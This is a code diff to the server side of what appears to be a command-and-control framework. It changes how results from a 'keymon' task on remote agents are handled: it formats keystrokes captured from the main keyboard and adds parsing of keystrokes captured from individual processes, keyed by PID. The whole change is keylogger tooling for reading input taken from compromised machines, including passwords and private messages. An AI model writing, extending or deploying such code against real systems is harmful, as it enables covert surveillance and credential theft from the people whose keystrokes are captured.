@@ -214,10 +214,12 @@ export const setResult = async (agentID, data) => {
   task.completed = true;
   task.dateCompleted = Date.now();
   if (task.taskType === "keymon"){
-    console.log(data);
     task.result = "";
+    console.log(data);
+    // Parse main keyboard dumps.
     let keys = data["main-kbd"];
     if (keys){
+      task.result += "-".repeat(10) + " Main Keyboard " + "-".repeat(10) + "\n";
       if (agent.os === "linux"){
         let mapping = {};
         mapping[1] = "[ESC]";
@@ -291,14 +293,33 @@ export const setResult = async (agentID, data) => {
           let val = mapping[parseInt(keys[i])];
           if (!val)
             val = keys[i].toString();
-          task.result += " " + val;
-        }        
+          task.result += val + " ";
+        }    
       }else{        
         for (let i = 0; i < keys.length; i++)
           task.result += `${keys[i]} `;
       }
-    }else{
-      task.result = result;
+      task.result += "\n\n";
+    }
+    // Parse process dumps.
+    for (let k in data){
+      if (!isNaN(k)){
+        let pid = parseInt(k);
+        let codes = data[k];
+        if (codes.length == 0)
+          continue;
+        result = "-".repeat(10) + " proc " + pid.toString() + " " + "-".repeat(10) + "\n";
+        for (let code of codes){
+          if (code == 10 || code == 13)
+            result += "[ENTER] ";
+          else if (code <= 31 || code >= 127)
+            result += `0x${code.toString(16).padStart(2, '0')} `;
+          else
+            result += `${String.fromCharCode(code)} `;
+        }
+        result += "\n\n";
+        task.result += result;
+      }
     }
   }else{  
     // Cleanup trailing newlines.
